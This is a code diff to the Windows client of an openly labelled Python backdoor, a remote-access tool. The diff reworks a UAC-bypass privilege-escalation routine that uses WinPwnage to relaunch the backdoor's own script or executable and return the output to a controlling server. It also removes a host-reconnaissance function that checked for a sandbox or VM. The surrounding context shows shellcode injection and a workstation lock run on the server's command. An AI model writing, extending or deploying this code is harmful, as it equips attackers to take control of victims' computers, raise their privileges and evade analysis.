@@ -5,8 +5,6 @@ https://github.com/xp4xbox/Python-Backdoor
 """
 import ctypes
 import os
-import platform
-import socket
 import subprocess
 import sys
 import threading
@@ -18,7 +16,6 @@ import wmi
 from io import StringIO
 
 from src.client.control.control import Control
-from src.client.persistence.windows import Windows as Persistence
 from src.definitions.commands import *
 
 from winpwnage.core.scanner import function as elevate
@@ -26,6 +23,8 @@ from winpwnage.core.error import WinPwnageError
 
 
 class Windows(Control):
+    def __init__(self, _es):
+        super().__init__(_es)
 
     # elevate with WinPwnage
     def elevate(self):
@@ -34,9 +33,16 @@ class Windows(Control):
         # capture stdout for sending back to server
         sys.stdout = stdout = StringIO()
 
+        payload = [f"{os.path.realpath(sys.argv[0])}"]
+
+        # support for py file only
+        if payload[0].endswith(".py"):
+            payload = [f"{sys.executable}", f"\"{payload[0]}\""]
+
         for i in range(1, 8):
             try:
-                elevate(uac=True, persist=False, elevate=False).run(id=str(i), payload=[f"{os.path.realpath(sys.argv[0])}"])
+                elevate(uac=True, persist=False, elevate=False).run(id=str(i),
+                                                                    payload=payload)
                 break
             except WinPwnageError:
                 pass
@@ -45,24 +51,7 @@ class Windows(Control):
         output = stdout.read()
         sys.stdout = old_stdout
 
-        self.es.sendall_json(SERVER_ELEVATE_RSP, output)
-
-    def get_info(self):
-        _hostname = socket.gethostname()
-        _platform = f"{platform.system()} {platform.release()}"
-
-        p = Persistence()
-
-        _platform += " (Sandboxie) " if p.detect_sandboxie() else ""
-        _platform += " (Virtual Machine) " if p.detect_vm() else ""
-
-        info = {"username": os.environ["USERNAME"], "hostname": _hostname, "platform": _platform,
-                "is_admin": bool(ctypes.windll.shell32.IsUserAnAdmin()), "architecture": platform.architecture(),
-                "machine": platform.machine(), "processor": platform.processor(),
-                "x64_python": ctypes.sizeof(ctypes.c_voidp) == 8, "is_unix": False,
-                "exec_path": os.path.realpath(sys.argv[0])}
-
-        return info
+        self.es.sendall_json(SUCCESS, output)
 
     def lock(self):
         ctypes.windll.user32.LockWorkStation()
@@ -147,3 +136,4 @@ class Windows(Control):
             self.es.send_json(ERROR, f"Error injecting shellcode {e}")
         else:
             self.es.send_json(SUCCESS)
+
